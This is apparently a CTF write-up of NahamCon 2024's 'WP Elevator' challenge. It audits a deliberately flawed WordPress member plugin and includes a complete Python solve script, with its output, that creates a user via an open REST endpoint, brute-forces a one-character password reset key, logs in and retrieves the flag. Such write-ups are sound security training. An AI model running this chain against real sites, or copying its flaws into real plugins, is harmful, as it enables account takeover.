# WP Elevator

## Table of Contents

  1. [Overview](#overview)  
  2. [Background](#background)  
  3. [Enumeration](#enumeration)  
    3.1. [WordPress REST API & AJAX Action](#wordpress-rest-api--ajax-action)  
    3.2. [Plugin REST API & AJAX Actions](#plugin-rest-api--ajax-actions)  
  4. [Exploitation](#exploitation)  
  5. [Conclusion](#conclusion)  

## Overview

- Solved by: @siunam
- Contributor: @jose.fk
- 494 solves / 36 points
- Author: Patchstack
- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

Asked my freelance developer friend to write me an authorization plugin so I can share knowledge with selected memebers. He is still working on it but gave me an early version. I don't know how it works but will talk with him once he finishes. 

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240527155825.png)

## Enumeration

**Index page:**

In here, it's just a default WordPress template.

There's not much we can do in here. In the challenge's description, it says there's an authorization plugin. Let's read the plugin source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/Sponsorship/WP-Elevator/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Sponsorship/WP-Elevator)-[2024.05.27|16:03:40(HKT)]
└> file attachment.zip                              
attachment.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Sponsorship/WP-Elevator)-[2024.05.27|16:03:42(HKT)]
└> unzip attachment.zip     
Archive:  attachment.zip
   creating: challenge-custom/
  inflating: challenge-custom/flag.txt  
   creating: challenge-custom/p-member-manager/
  inflating: challenge-custom/p-member-manager/LICENSE.txt  
  inflating: challenge-custom/p-member-manager/README.txt  
   creating: challenge-custom/p-member-manager/admin/
  inflating: challenge-custom/p-member-manager/admin/class-p-member-manager-admin.php  
   creating: challenge-custom/p-member-manager/admin/css/
  inflating: challenge-custom/p-member-manager/admin/css/p-member-manager-admin.css  
  inflating: challenge-custom/p-member-manager/admin/index.php  
   creating: challenge-custom/p-member-manager/admin/js/
  inflating: challenge-custom/p-member-manager/admin/js/p-member-manager-admin.js  
   creating: challenge-custom/p-member-manager/admin/partials/
  inflating: challenge-custom/p-member-manager/admin/partials/p-member-manager-admin-display.php  
   creating: challenge-custom/p-member-manager/includes/
  inflating: challenge-custom/p-member-manager/includes/class-p-member-manager-activator.php  
  inflating: challenge-custom/p-member-manager/includes/class-p-member-manager-deactivator.php  
  inflating: challenge-custom/p-member-manager/includes/class-p-member-manager-i18n.php  
  inflating: challenge-custom/p-member-manager/includes/class-p-member-manager-loader.php  
  inflating: challenge-custom/p-member-manager/includes/class-p-member-manager.php  
  inflating: challenge-custom/p-member-manager/includes/index.php  
  inflating: challenge-custom/p-member-manager/index.php  
   creating: challenge-custom/p-member-manager/languages/
  inflating: challenge-custom/p-member-manager/languages/p-member-manager.pot  
  inflating: challenge-custom/p-member-manager/p-member-manager.php  
   creating: challenge-custom/p-member-manager/public/
  inflating: challenge-custom/p-member-manager/public/class-p-member-manager-public.php  
   creating: challenge-custom/p-member-manager/public/css/
  inflating: challenge-custom/p-member-manager/public/css/p-member-manager-public.css  
  inflating: challenge-custom/p-member-manager/public/index.php  
   creating: challenge-custom/p-member-manager/public/js/
  inflating: challenge-custom/p-member-manager/public/js/p-member-manager-public.js  
   creating: challenge-custom/p-member-manager/public/partials/
  inflating: challenge-custom/p-member-manager/public/partials/p-member-manager-public-display.php  
  inflating: challenge-custom/p-member-manager/uninstall.php  
  inflating: deploy.sh               
   creating: docker/
   creating: docker/wordpress/
   creating: docker/wordpress/toolbox/
  inflating: docker/wordpress/toolbox/Dockerfile  
  inflating: docker/wordpress/toolbox/Makefile  
  inflating: docker-compose.yml      
  inflating: Dockerfile              
  inflating: Makefile                
  inflating: .env                    
```

After reading the plugin source code, we can have the following findings:

1. the plugin name is called "Patchstack Member Manager";
2. the **main logic** of the plugin is at **`challenge-custom/p-member-manager/p-member-manager.php`**, other files were just WordPress plugin boilerplate.

Let's dig deeper into `challenge-custom/p-member-manager/p-member-manager.php`!

### WordPress REST API & AJAX Action

In this plugin, it has:

- 1 REST API endpoint:

```php
[...]
add_action("rest_api_init", "register_user_creation_endpoint");

function register_user_creation_endpoint()
{
    register_rest_route("user/v1", "/create", [
        "methods" => "POST",
        "callback" => "create_user_via_api",
        "permission_callback" => "__return_true", // Allow anyone to access this endpoint
    ]);
}
[...]
function create_user_via_api($request)
{
    [...]
}
```

> The WordPress REST API provides an interface for applications to interact with your WordPress site by sending and receiving data as [JSON](https://en.wikipedia.org/wiki/JSON) (JavaScript Object Notation) objects.[...]
> 
> Using the WordPress REST API you can create a plugin to provide an entirely new admin experience for WordPress, build a brand new interactive front-end experience, or bring your WordPress content into completely separate applications. - [https://developer.wordpress.org/rest-api/](https://developer.wordpress.org/rest-api/)

As you can see, we can interact with the plugin using the WordPress REST API.

Hmm... Where's the base route (endpoint)? According to [WordPress Developer Resources](https://developer.wordpress.org/rest-api/), the WordPress REST API base route is at **`/wp-json/`**.

Therefore, we can send a **POST request to `/wp-json/user/v1/create`** to call function **`create_user_via_api`**.

- 4 AJAX actions:

```php
[...]
add_action("wp_ajax_reset_key", "reset_password_key_callback");
add_action("wp_ajax_nopriv_reset_key", "reset_password_key_callback");
[...]
add_action("wp_ajax_get_latest_posts", "get_latest_posts_callback");
[...]
add_action("wp_ajax_patchstack_flagger", "flagger_request_callback");
```

In WordPress, it also supports [AJAX](https://developer.wordpress.org/plugins/javascript/ajax/), which allows users to perform actions without refreshing the current page.

In the [documentation](https://developer.wordpress.org/plugins/javascript/ajax/#url), all WordPress AJAX requests must be sent to **`wp-admin/admin-ajax.php`**.

> Note: For more information about WordPress AJAX, you can read the [documentation](https://developer.wordpress.org/plugins/javascript/ajax/).

Hmm... I wonder how can we call those AJAX actions...

If we look at [`/wp-admin/admin/admin-ajax.php` source code](https://github.com/WordPress/WordPress/blob/master/wp-admin/admin-ajax.php#L176-L208), we can see that the logic of calling an AJAX action:

```php
[...]
$action = $_REQUEST['action'];

if ( is_user_logged_in() ) {
    // If no action is registered, return a Bad Request response.
    if ( ! has_action( "wp_ajax_{$action}" ) ) {
        wp_die( '0', 400 );
    }

    /**
     * Fires authenticated Ajax actions for logged-in users.
     *
     * The dynamic portion of the hook name, `$action`, refers
     * to the name of the Ajax action callback being fired.
     *
     * @since 2.1.0
     */
    do_action( "wp_ajax_{$action}" );
} else {
    // If no action is registered, return a Bad Request response.
    if ( ! has_action( "wp_ajax_nopriv_{$action}" ) ) {
        wp_die( '0', 400 );
    }

    /**
     * Fires non-authenticated Ajax actions for logged-out users.
     *
     * The dynamic portion of the hook name, `$action`, refers
     * to the name of the Ajax action callback being fired.
     *
     * @since 2.8.0
     */
    do_action( "wp_ajax_nopriv_{$action}" );
}
[...]
```

As you can see, when parameter name `action` is provided, it'll call the AJAX action with **`wp_ajax_{action_parameter_value}`**.

Also, when we're not authenticated, it'll call the AJAX action with **`wp_ajax_nopriv_{action_parameter_value}`**.

Now, let's deep dive into those REST API and AJAX actions!

### Plugin REST API & AJAX Actions

First, where's our objective, the flag?

In AJAX **authenticated** action **`patchstack_flagger`**, the callback function is **`flagger_request_callback`**:

```php
[...]
function flagger_request_callback()
{
    // Validate nonce
    $nonce = isset($_REQUEST["nonce"])
        ? sanitize_text_field($_REQUEST["nonce"])
        : "";
    if (!wp_verify_nonce($nonce, "get_latest_posts_nonce")) {
        wp_send_json_error("Invalid nonce.");
        return;
    }
    $user = wp_get_current_user();
    $allowed_roles = ["administrator", "subscriber"];
    if (array_intersect($allowed_roles, $user->roles)) {
        $value = file_get_contents('/flag.txt');
        wp_send_json_success(["value" => $value]);
    } else {
        wp_send_json_error("Missing permission.");
    }
}
[...]
```

When we send AJAX action `patchstack_flagger` request with parameter `nonce`, it'll first sanitize and validate the `nonce`'s value. If it's correct and we're role `administrator` **OR** `subscriber`, it'll send the flag to us!

That being said, we'll need to be **authenticated** with role `administrator` **OR** `subscriber`!

Wait... How can we get a valid `nonce` value?

Luckily, AJAX **authenticated** action **`get_latest_posts`** can help us. If we look at the **callback function `get_latest_posts_callback`**, you'll know how:

```php
[...]
add_action("wp_ajax_get_latest_posts", "get_latest_posts_callback");

function get_latest_posts_callback()
{
    // Check if the current user has the subscriber role
    if (!current_user_can("subscriber")) {
        wp_send_json_error("Unauthorized access.");
        return;
    }

    // Generate nonce
    $nonce = wp_create_nonce("get_latest_posts_nonce");

    // Get latest 5 posts
    $args = [
        "posts_per_page" => 5,
        "post_status" => "publish",
        "orderby" => "date",
        "order" => "DESC",
    ];

    $latest_posts = get_posts($args);

    // Prepare posts data
    $posts_data = [];
    foreach ($latest_posts as $post) {
        $posts_data[] = [
            "title" => $post->post_title,
            "content" => $post->post_content,
            "link" => get_permalink($post),
        ];
    }

    // Send response with nonce and posts data
    wp_send_json_success(["nonce" => $nonce, "posts" => $posts_data]);
}
[...]
```

**If we have the `subscriber` role**, it'll get 5 latest posts and **generate a valid nonce** for us!

Nice! So we can use the **AJAX action `get_latest_posts` to get a valid nonce**, then **use that nonce to get the flag via AJAX action `patchstack_flagger`**!

Oh wait... Those actions need authentication... How can we authenticate in the first place? And how to create a new user?

Ah ha! Did you remember the REST API endpoint `POST /wp-json/user/v1/create`?

```php
[...]
add_action("rest_api_init", "register_user_creation_endpoint");

function register_user_creation_endpoint()
{
    register_rest_route("user/v1", "/create", [
        "methods" => "POST",
        "callback" => "create_user_via_api",
        "permission_callback" => "__return_true", // Allow anyone to access this endpoint
    ]);
}
[...]
```

According to [WordPress Developer Resources](https://developer.wordpress.org/rest-api/extending-the-rest-api/adding-custom-endpoints/#permissions-callback), if the API endpoint wanted to be public, `__return_true` is needed for the permission callback.

So, this API endpoint is publicly accessible! Now, let's take a look at the **callback function `create_user_via_api`**:

```php
[...]
function create_user_via_api($request)
{
    $parameters = $request->get_json_params();

    $username = sanitize_text_field($parameters["username"]);
    $email = sanitize_email($parameters["email"]);
    $password = wp_generate_password();

    // Create user
    $user_id = wp_create_user($username, $password, $email);

    if (is_wp_error($user_id)) {
        return new WP_Error(
            "user_creation_failed",
            __("User creation failed.", "text_domain"),
            ["status" => 500]
        );
    }

    // Add user role
    $user = new WP_User($user_id);
    $user->set_role("subscriber");

    return [
        "message" => __("User created successfully.", "text_domain"),
        "user_id" => $user_id,
    ];
}
[...]
```

As you can see, it needs 2 parameters in JSON format, which are `username` and `email`. However, we don't need to provide a `password` parameter, because the function uses [function `wp_generate_password`](https://developer.wordpress.org/reference/functions/wp_generate_password/) to **generate random password** for us.

After that, it'll create a new user using [function `wp_create_user`](https://developer.wordpress.org/reference/functions/wp_create_user/), and **assign role `subscriber` to our newly created user**!

That being said, we should be able to get the flag by simply creating a new user at the REST API endpoint `POST /wp-json/user/v1/create`?

Wait... **The password is randomly generated**... How can we login to that new user without knowing the password...

Don't worry, AJAX **unauthenticated** action **`reset_key`** can also help us! Let's take a closer look in this action's **callback function `reset_password_key_callback`**:

```php
[...]
add_action("wp_ajax_reset_key", "reset_password_key_callback");
add_action("wp_ajax_nopriv_reset_key", "reset_password_key_callback");

function reset_password_key_callback()
{
    $user_id = isset($_POST["user_id"]) ? intval($_POST["user_id"]) : 0;
    $user = new WP_User($user_id);
    if ($user_id > 1) {
        if (
            !empty($user->roles) &&
            is_array($user->roles) &&
            in_array("subscriber", $user->roles)
        ) {
            $updated = get_password_reset_key2($user);
            if (is_wp_error($updated)) {
                wp_send_json_error("Failed to reset password key.");
            } else {
                wp_send_json_success([
                    "message" => "Password reset key reset successfully.",
                ]);
            }
        } else {
            wp_send_json_error("User is not a subscriber.");
        }
    } else {
        wp_send_json_error("Invalid user ID.");
    }
}
[...]
```

In this action, we need to provide **POST parameter `user_id`** (Default `0`). If the `user_id` is greater than `1` and has `subscriber` role, it'll call **function `get_password_reset_key2`**:

```php
[...]
function get_password_reset_key2($user)
{
    global $wp_hasher;
    [...]
    // Generate something random for a password reset key.
    $key = wp_generate_password(1, false);
    [...]
    // Now insert the key, hashed, into the DB.
    if (empty($wp_hasher)) {
        require_once ABSPATH . WPINC . "/class-phpass.php";
        $wp_hasher = new PasswordHash(8, true);
    }

    $hashed = time() . ":" . $wp_hasher->HashPassword($key);

    $key_saved = wp_update_user([
        "ID" => $user->ID,
        "user_activation_key" => $hashed,
    ]);

    if (is_wp_error($key_saved)) {
        return $key_saved;
    }

    return $key;
}
[...]
```

In this function, it'll generate a random password, then using the [PHP Password Library, phpass](https://github.com/rchouinard/phpass) to **calculate a bcrypt hash with the random password input**.

After calculating the bcrypt hash, it'll **update the user's activation key to `<current_time>:<bcrypt_hash>`**.

Hmm... Did you catch that?

```php
[...]
// Generate something random for a password reset key.
$key = wp_generate_password(1, false);
[...]
```

In here, the argument `1` is the generated password length. [By default, it's `12`](https://developer.wordpress.org/reference/functions/wp_generate_password/#parameters). Also, the argument `false` is to exclude standard special characters. [By default, it's `true`](https://developer.wordpress.org/reference/functions/wp_generate_password/#parameters).

With that said, **the `$key` only consists of 1 normal character**! (The normal character set can be seen via the [function reference](https://developer.wordpress.org/reference/functions/wp_generate_password/#parameters).) Which means **it's very, very easy to brute force the activation key**.

Uh... **How does WordPress validate the password reset activation key**?

If we look at the [source code of `/wp-login.php`](https://github.com/WordPress/WordPress/blob/master/wp-login.php#L930-L1092), we can understand the logic of WordPress validating password reset activation key.

When we send a **GET** request with parameter `action=rp` (or `action=resetpass`), `key`, and `login`, it'll **set a new cookie named `wp-resetpass-<COOKIEHASH>`** with value `<login_parameter_value>:<key_parameter_value>` and redirect us to `/wp-login.php`:

```php
[...]
$action = isset( $_REQUEST['action'] ) ? $_REQUEST['action'] : 'login';
[...]
switch ( $action ) {
    [...]
    case 'resetpass':
    case 'rp':
        list( $rp_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
        $rp_cookie       = 'wp-resetpass-' . COOKIEHASH;

        if ( isset( $_GET['key'] ) && isset( $_GET['login'] ) ) {
            $value = sprintf( '%s:%s', wp_unslash( $_GET['login'] ), wp_unslash( $_GET['key'] ) );
            setcookie( $rp_cookie, $value, 0, $rp_path, COOKIE_DOMAIN, is_ssl(), true );

            wp_safe_redirect( remove_query_arg( array( 'key', 'login' ) ) );
            exit;
        }
        [...]
```

> Note: The [`COOKIEHASH` constant](https://developer.wordpress.org/reference/functions/wp_cookie_constants/) is the calculated MD5 hash of the WordPress `siteurl`.

When we send a **POST** request, it'll check whether the cookie `wp-resetpass-<COOKIEHASH>`'s value matches POST parameter `rp_key`'s value or not. It also checks if POST parameter `pass1` is provided or not. If the key is invalid or expired, it'll redirect us to `/wp-login.php`:

```php
        [...]
        if ( isset( $_COOKIE[ $rp_cookie ] ) && 0 < strpos( $_COOKIE[ $rp_cookie ], ':' ) ) {
            list( $rp_login, $rp_key ) = explode( ':', wp_unslash( $_COOKIE[ $rp_cookie ] ), 2 );

            $user = check_password_reset_key( $rp_key, $rp_login );

            if ( isset( $_POST['pass1'] ) && ! hash_equals( $rp_key, $_POST['rp_key'] ) ) {
                $user = false;
            }
        } else {
            $user = false;
        }

        if ( ! $user || is_wp_error( $user ) ) {
            setcookie( $rp_cookie, ' ', time() - YEAR_IN_SECONDS, $rp_path, COOKIE_DOMAIN, is_ssl(), true );

            if ( $user && $user->get_error_code() === 'expired_key' ) {
                wp_redirect( site_url( 'wp-login.php?action=lostpassword&error=expiredkey' ) );
            } else {
                wp_redirect( site_url( 'wp-login.php?action=lostpassword&error=invalidkey' ) );
            }

            exit;
        }
        [...]
```

If the POST request passed the password reset activation key validation, it'll then check whether the POST parameter `pass1` and `pass2` is matched or not. **If every checks are passed, it'll reset the user's password** based on POST parameter `pass1`'s value via [function `reset_password`](https://developer.wordpress.org/reference/functions/reset_password/):

```php
        [...]
        // Check if password is one or all empty spaces.
        if ( ! empty( $_POST['pass1'] ) ) {
            $_POST['pass1'] = trim( $_POST['pass1'] );

            if ( empty( $_POST['pass1'] ) ) {
                $errors->add( 'password_reset_empty_space', __( 'The password cannot be a space or all spaces.' ) );
            }
        }

        // Check if password fields do not match.
        if ( ! empty( $_POST['pass1'] ) && trim( $_POST['pass2'] ) !== $_POST['pass1'] ) {
            $errors->add( 'password_reset_mismatch', __( '<strong>Error:</strong> The passwords do not match.' ) );
        }
        [...]
        do_action( 'validate_password_reset', $errors, $user );

        if ( ( ! $errors->has_errors() ) && isset( $_POST['pass1'] ) && ! empty( $_POST['pass1'] ) ) {
            reset_password( $user, $_POST['pass1'] );
            [...]
            exit;
        }
        [...]
```

With that said, **the `key` should be in `<current_time>:<bcrypt_hash>` format**?

Actually, nope...

According to [function `check_password_reset_key` reference](https://developer.wordpress.org/reference/functions/check_password_reset_key/), the description said:

> ***A key is considered ‘expired’ if it exactly matches the value of the user_activation_key field, rather than being matched after going through the hashing process.*** This field is now hashed; old values are no longer accepted but have a different [WP_Error](https://developer.wordpress.org/reference/classes/wp_error/) code so good user feedback can be provided.

Huh??? Why WordPress is doing this?

Hence, **the `key` is actually just the 1 normal character random password**. After that, WordPress will use function `check_password_reset_key` to recalculate the activation key again.

So, to reset our new user's password, we need to:

1. Send a GET request to `/wp-login.php?action=rp&login=<username_here>&key=<1_normal_character_random_password>` and get the cookie `wp-resetpass-<COOKIEHASH>` 
2. Send a POST request to `/wp-login.php?action=rp` with cookie `wp-resetpass-<COOKIEHASH>=<username_here>:<1_normal_character_random_password>` and parameter `pass1=<anything>`, `pass2=<anything>`, and `rp_key=<1_normal_character_random_password>`

## Exploitation

Let's put everything back together!

**To get the flag, we need to:**

1. Create a new user with `subscriber` role at REST API endpoint `POST /wp-json/user/v1/create`
2. Generate a very weak password reset activation key for our new user at AJAX unauthenticated action `reset_key`
3. Reset our new user's password via `/wp-login.php?action=rp`
4. Get a valid nonce via AJAX authenticated action `get_latest_posts`
5. Get the flag via AJAX authentication action `patchstack_flagger` with the valid nonce

To test the above processes, we can run the WordPress application **locally**!

But before we do that, we'll need to **modify the `.env` file's `WORDPRESS_WEBSITE_URL` and `WORDPRESS_WEBSITE_URL_WITHOUT_HTTP` environment variable's port from `8687` to `8686`**:

```
WORDPRESS_WEBSITE_URL="http://localhost:8686"
WORDPRESS_WEBSITE_URL_WITHOUT_HTTP="localhost:8686"
```

This is because the `docker.compose.yml`'s service `wp_service_1` exposes port `8686`, but the `.env` file sets to port `8687`.

**After that, we can build and run in detach mode for all the Docker containers via `docker-compose`:**
```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Sponsorship/WP-Elevator)-[2024.05.28|15:43:12(HKT)]
└> docker-compose -f 'docker-compose.yml' up -d --build
```

Now we should be able to access the WordPress application at `http://localhost:8686/`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2024/images/Pasted%20image%2020240528154821.png)

**To get the flag, I wrote a solve script to automate all the above exploitation steps:**
```python
#!/usr/bin/env python3
import requests
import random
from string import ascii_lowercase

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.Session()
        self.username = ''.join(random.choice(ascii_lowercase) for i in range(10)) # generate 10 characters random username
        self.email = ''.join(random.choice(ascii_lowercase) for i in range(10)) + '@test.local' # generate random email address
        self.password = ''.join(random.choice(ascii_lowercase) for i in range(10)) # generate 10 characters random password
        self.userId = int()
        self.nonce = str()
        self.CREATE_USER_REST_API_ENDPOINT = '/wp-json/user/v1/create'
        self.AJAX_ENDPOINT = '/wp-admin/admin-ajax.php'
        self.AJAX_ACTION_RESET_KEY = '?action=reset_key'
        self.AJAX_ACTION_GET_LATEST_POSTS = '?action=get_latest_posts'
        self.AJAX_ACTION_PATCHSTACK_FLAGGER = '?action=patchstack_flagger'
        self.PARAMETER_RESET_PASSWORD_ACTION = '?action=rp'
        self.LOGIN_PAGE_ENDPOINT = '/wp-login.php'
        self.LOGIN_PAGE_ENDPOINT_RESET_PASSWORD = f'{self.LOGIN_PAGE_ENDPOINT}{self.PARAMETER_RESET_PASSWORD_ACTION}'
        self.CHARACTER_SET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    def createNewUser(self):
        print('[*] Creating a new user...')
        bodyData = {
            'username': self.username,
            'email': self.email
        }

        response = self.session.post(f'{self.baseUrl}{self.CREATE_USER_REST_API_ENDPOINT}', 
                          json=bodyData)
        self.userId = response.json()['user_id']
        print(f'[+] Created a new user. Username: {self.username}, user ID: {self.userId}')

    def generateActivationKey(self):
        print(f'[*] Generating a password reset activation key for user "{self.username}"...')
        bodyData = { 'user_id': str(self.userId) }

        self.session.post(f'{self.baseUrl}{self.AJAX_ENDPOINT}{self.AJAX_ACTION_RESET_KEY}', 
                          data=bodyData)
        print(f'[+] Generated a password reset activation key for user "{self.username}"')

    def resetPassword(self):
        print(f'[*] Resetting password for user "{self.username}"...')
        for key in self.CHARACTER_SET:
            print(f'[*] Trying key "{key}"...')
            getParameters = f'&login={self.username}&key={key}'
            self.session.get(f'{self.baseUrl}{self.LOGIN_PAGE_ENDPOINT_RESET_PASSWORD}{getParameters}')
            
            bodyData = {
                'pass1': self.password,
                'pass2': self.password,
                'rp_key': key
            }
            response = self.session.post(f'{self.baseUrl}{self.LOGIN_PAGE_ENDPOINT_RESET_PASSWORD}',
                              data=bodyData)
            isCorrectKey = True if 'Your password reset link appears to be invalid.' not in response.text else False
            if not isCorrectKey:
                continue

            print(f'[+] Found the correct password reset activation key "{key}"!')
            print(f'[+] User {self.username}\'s password has been reset to "{self.password}"')
            break

    def login(self):
        print(f'[*] Logging in as user "{self.username}"...')
        bodyData = {
            'log': self.username,
            'pwd': self.password
        }
        self.session.post(f'{self.baseUrl}{self.LOGIN_PAGE_ENDPOINT}',
                          data=bodyData)
        print(f'[+] Logged in as user "{self.username}"')

    def getValidNonce(self):
        print('[*] Getting a valid nonce...')
        response = self.session.get(f'{self.baseUrl}{self.AJAX_ENDPOINT}{self.AJAX_ACTION_GET_LATEST_POSTS}')
        self.nonce = response.json()['data']['nonce']

        print(f'[+] Valid nonce: "{self.nonce}"')

    def getFlag(self):
        print(f'[*] Getting the flag with nonce "{self.nonce}"...')
        nonceParameter = f'&nonce={self.nonce}'
        response = self.session.get(f'{self.baseUrl}{self.AJAX_ENDPOINT}{self.AJAX_ACTION_PATCHSTACK_FLAGGER}{nonceParameter}')

        flag = response.json()['data']['value']
        print(f'[+] We got the flag: "{flag}"')


    def solve(self):
        self.createNewUser()
        self.generateActivationKey()
        self.resetPassword()

        self.login()
        self.getValidNonce()
        self.getFlag()

if __name__ == '__main__':
    baseUrl = 'http://localhost:8686' # change this URL if needed
    solver = Solver(baseUrl)

    solver.solve()
```

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2024/Sponsorship/WP-Elevator)-[2024.05.28|18:04:33(HKT)]
└> python3 solve.py
[*] Creating a new user...
[+] Created a new user. Username: lfylselqcx, user ID: 2
[*] Generating a password reset activation key for user "lfylselqcx"...
[+] Generated a password reset activation key for user "lfylselqcx"
[*] Resetting password for user "lfylselqcx"...
[*] Trying key "a"...
[*] Trying key "b"...
[...]
[*] Trying key "A"...
[*] Trying key "B"...
[*] Trying key "C"...
[+] Found the correct password reset activation key "C"!
[+] User lfylselqcx's password has been reset to "moyuhpgxzz"
[*] Logging in as user "lfylselqcx"...
[+] Logged in as user "lfylselqcx"
[*] Getting a valid nonce...
[+] Valid nonce: "415a04ae4b"
[*] Getting the flag with nonce "415a04ae4b"...
[+] We got the flag: "CTF{DEFINETLY_NOT_THE_FLAG}"
```

Nice! We got the flag!!

- **Flag: `CTF{n0nc3s_f0r_auth0riz4t10n}`**

## Conclusion

What we've learned:

1. WordPress plugin source code audit